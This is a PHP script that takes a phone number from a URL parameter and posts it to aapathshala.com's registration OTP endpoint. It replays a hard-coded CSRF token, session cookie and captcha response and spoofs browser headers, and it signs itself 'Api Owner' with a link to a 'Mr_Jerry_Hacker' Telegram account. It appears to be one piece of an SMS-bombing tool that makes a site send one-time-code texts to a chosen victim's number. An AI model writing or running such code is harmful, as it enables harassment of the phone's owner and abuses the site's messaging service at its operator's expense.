<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Get the phone parameter from the URL
$phone = isset($_GET['phone']) ? $_GET['phone'] : '';

// Remove any non-digit characters from the phone number
$phone = preg_replace('/\D/', '', $phone);

// Check if the phone number is 11 digits and starts with 0
if (strlen($phone) !== 11 || $phone[0] !== '0') {
    die('Invalid phone number. It must be an 11-digit number starting with 0.');
}

// Set up data with the phone number for the request
$data = http_build_query([
    'csrfmiddlewaretoken' => '935FtnlZASUEcrIKeDrvIPhoNNagfWDUSzW1v0VpweP6iF7ZAiPIFmZy5XqVbIt7',
    'fname' => 'Shahin Islam',
    'contact_no' => $phone,
    'g-recaptcha-response' => '03AFcWeA7r8ZUl3lLxKU4eh-Cnu-l7VG5RyUgd-rQpRkZqinIIe5aN-qNWnKwv3jfdFVdbnmugi_sJzzYSK8CN7uTa3NpeSqdXSBcSaJ4URnPwTdVB3xXuiNTVFyl1kIQuhKmTAJ6Uxxh3Kik6yZ31p8-6oR4SkEakMSgMpaWeKdJlGTSQVmOw0dmTn6ZFSS5ThOu_3fAGhr6EgGyolhnJ7yf7D7V6YRT_yJVU4mypNGjG6wmdGWmtCO9fpaQ6LdC2GhJCdtkh1jVUrLsTcT-DSjGNj-1M_BSNqO4eUQohboFIVHnDjDRx23-UmcNY25aRTAM4uyAD47XAOu6LudcF_kVQ8J3lV6p8NJwguUWHGNATNa_7gNnzZ5JGBoHi20V975abpHwgY3ZDRpfks_lxvKku8Y0q8nW1p-GtKvijToRr_ceZi6m7wlZnf9bb4nPIdtoWATE_ks70Sbo-j2wYvKjy6tj4QJdmhShb8mmsVLRs_GkhZPIXBslaGPAt7UWeNABtMMTWq840J6Yhx1vUVkOYX4pM5a2Gms1IAbsE4Y8e86qWKjUOG_QHn02Fj-qRItYunOsvogC2t651eEOPtHwUin8RxTSD4YR87cqbgZdTuufDuJsGxT0oDj6KdcX1u6_KxD2o-e1by0DFJcRqjCQK4pcr150piJGG-9i0bBR5SnAELnCURKlIWLuJNWwv9hwZ_OMrljilMzGuJ71j6bwuy_Hzn7NPxWamxMU1xkexaOhwZrHdrkA62bylHgMHzld2kD3Xf_RxNcfyIxdeoMoLCEBCMMomuf9KXvIGSSnNA6HX6As3kqpDMtDNTufzbETzQmqGyPuvccEi_ITGAJgu2da9TYa5hg'
]);

// Initialize cURL session
$ch = curl_init();

// Set the cURL options
curl_setopt($ch, CURLOPT_URL, 'https://aapathshala.com/registration/?action=sendotp');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language: en-US,en;q=0.9,bn;q=0.8',
    'Cache-Control: max-age=0',
    'Content-Type: application/x-www-form-urlencoded',
    'Cookie: csrftoken=0NzfDxDWs7oYrHuBVDUBiRHHVj9BVAkIJjqBFadmotjqxVTQhiiOfopRdtpgRmaV',
    'Origin: https://aapathshala.com',
    'Referer: https://aapathshala.com/registration/',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-User: ?1',
    'Upgrade-Insecure-Requests: 1',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'sec-ch-ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"'
]);

// Execute the request
$response = curl_exec($ch);

// Check for errors
if ($response === false) {
    echo 'Curl error: ' . curl_error($ch);
} else {
    // Output success response
    echo "Api Owner : Mɾ. Jҽɾɾყ 😈<br>";
    echo "Telegram : t.me/Mr_Jerry_Hacker";
}

// Close the cURL session
curl_close($ch);
?>
